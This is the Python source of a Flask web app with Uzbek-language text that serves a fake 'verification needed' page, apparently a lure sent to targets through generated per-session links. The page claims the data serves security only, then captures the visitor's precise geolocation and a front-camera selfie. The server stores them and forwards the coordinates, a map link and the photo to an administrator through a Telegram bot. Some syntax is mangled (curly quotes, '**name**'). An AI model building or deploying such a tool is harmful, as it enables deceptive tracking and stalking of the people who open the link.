from flask import Flask, request, jsonify, render_template_string
import os
import base64
import json
from datetime import datetime
import requests

app = Flask(**name**)

BOT_TOKEN = “YOUR_BOT_TOKEN_HERE”
ADMIN_ID = “YOUR_ADMIN_ID_HERE”
UPLOAD_FOLDER = “dalillar”

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# =====================

# HTML SAHIFA

# =====================

HTML = “””

<!DOCTYPE html>

<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tasdiqlash</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            padding: 30px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            text-align: center;
        }
        .icon { font-size: 60px; margin-bottom: 20px; }
        h2 { color: #1a1a2e; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 25px; line-height: 1.6; }
        .btn {
            background: #2563eb;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 10px;
            transition: 0.3s;
        }
        .btn:hover { background: #1d4ed8; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }
        .status.success { background: #d1fae5; color: #065f46; display: block; }
        .status.error { background: #fee2e2; color: #991b1b; display: block; }
        .status.loading { background: #dbeafe; color: #1e40af; display: block; }
        video { width: 100%; border-radius: 10px; margin-bottom: 15px; display: none; }
        canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🔐</div>
        <h2>Tasdiqlash kerak</h2>
        <p>Davom etish uchun joylashuvingiz va rasmingizni tasdiqlang. Bu ma'lumotlar faqat xavfsizlik maqsadida ishlatiladi.</p>

```
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <button class="btn" id="btnRuxsat" onclick="ruxsatOl()">
        ✅ Ruxsat beraman
    </button>

    <div class="status" id="status"></div>
</div>

<script>
    const sessionId = "{{ session_id }}";
    let stream = null;
    let lokatsiya = null;

    async function ruxsatOl() {
        const btn = document.getElementById('btnRuxsat');
        const status = document.getElementById('status');
        const video = document.getElementById('video');

        btn.disabled = true;
        status.className = 'status loading';
        status.textContent = '⏳ Ruxsat so\'ralmoqda...';

        try {
            // 1. Lokatsiya olish
            status.textContent = '📍 Joylashuv aniqlanmoqda...';
            lokatsiya = await getLokatsiya();

            // 2. Kamera olish
            status.textContent = '📸 Kamera ochilmoqda...';
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' }, 
                audio: false 
            });
            video.style.display = 'block';
            video.srcObject = stream;

            // 3. Rasm olish
            await new Promise(r => setTimeout(r, 1500));
            const rasm = rasmOl();

            // 4. Serverga yuborish
            status.textContent = '📤 Yuborilmoqda...';
            await yuborish(lokatsiya, rasm);

            // 5. Kamerani o'chirish
            stream.getTracks().forEach(t => t.stop());
            video.style.display = 'none';

            status.className = 'status success';
            status.textContent = '✅ Tasdiqlandi! Rahmat.';

        } catch (err) {
            status.className = 'status error';
            if (err.code === 1) {
                status.textContent = '❌ Ruxsat berilmadi. Iltimos qayta urinib ko\'ring.';
            } else {
                status.textContent = '❌ Xatolik: ' + err.message;
            }
            btn.disabled = false;
        }
    }

    function getLokatsiya() {
        return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
                pos => resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    aniqlik: pos.coords.accuracy
                }),
                err => reject(err),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }

    function rasmOl() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        return canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
    }

    async function yuborish(lokatsiya, rasm) {
        const res = await fetch('/dalil', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                session_id: sessionId,
                lokatsiya: lokatsiya,
                rasm: rasm,
                vaqt: new Date().toISOString()
            })
        });
        if (!res.ok) throw new Error('Server xatosi');
    }
</script>
```

</body>
</html>
"""

# =====================

# ROUTES

# =====================

@app.route(’/tekshir/<session_id>’)
def sahifa(session_id):
return render_template_string(HTML, session_id=session_id)

@app.route(’/dalil’, methods=[‘POST’])
def dalil_qabul():
data = request.json
session_id = data.get(‘session_id’, ‘nomalum’)
lokatsiya = data.get(‘lokatsiya’, {})
rasm_b64 = data.get(‘rasm’, ‘’)
vaqt = data.get(‘vaqt’, datetime.now().isoformat())

```
# Papka yaratish
papka = os.path.join(UPLOAD_FOLDER, session_id)
os.makedirs(papka, exist_ok=True)

# Rasmni saqlash
rasm_fayl = os.path.join(papka, 'selfie.jpg')
with open(rasm_fayl, 'wb') as f:
    f.write(base64.b64decode(rasm_b64))

# Lokatsiyani saqlash
info = {
    "session_id": session_id,
    "vaqt": vaqt,
    "lokatsiya": lokatsiya,
    "google_maps": f"https://maps.google.com/?q={lokatsiya.get('lat')},{lokatsiya.get('lon')}"
}
with open(os.path.join(papka, 'malumot.json'), 'w', encoding='utf-8') as f:
    json.dump(info, f, ensure_ascii=False, indent=2)

# Adminga Telegram xabari
xabar = (
    f"🚨 *Yangi dalil keldi!*\n\n"
    f"🆔 Session: `{session_id}`\n"
    f"📍 Joylashuv: [{lokatsiya.get('lat')}, {lokatsiya.get('lon')}]\n"
    f"🗺 Xarita: [Google Maps]({info['google_maps']})\n"
    f"📏 Aniqlik: {lokatsiya.get('aniqlik', '?')} metr\n"
    f"🕐 Vaqt: {vaqt[:19].replace('T', ' ')}"
)

# Matn yuborish
requests.post(
    f"https://api.telegram.bot/bot{BOT_TOKEN}/sendMessage",
    json={
        "chat_id": ADMIN_ID,
        "text": xabar,
        "parse_mode": "Markdown"
    }
)

# Rasmni yuborish
with open(rasm_fayl, 'rb') as f:
    requests.post(
        f"https://api.telegram.bot/bot{BOT_TOKEN}/sendPhoto",
        data={"chat_id": ADMIN_ID, "caption": f"📸 Selfie — {session_id}"},
        files={"photo": f}
    )

return jsonify({"status": "ok"})
```

# =====================

# HAVOLA GENERATSIYA

# =====================

@app.route(’/havola/<session_id>’)
def havola(session_id):
return jsonify({
“havola”: f”https://SIZNING_DOMENINGIZ/tekshir/{session_id}”
})

if **name** == ‘**main**’:
app.run(host=‘0.0.0.0’, port=5000, debug=False)
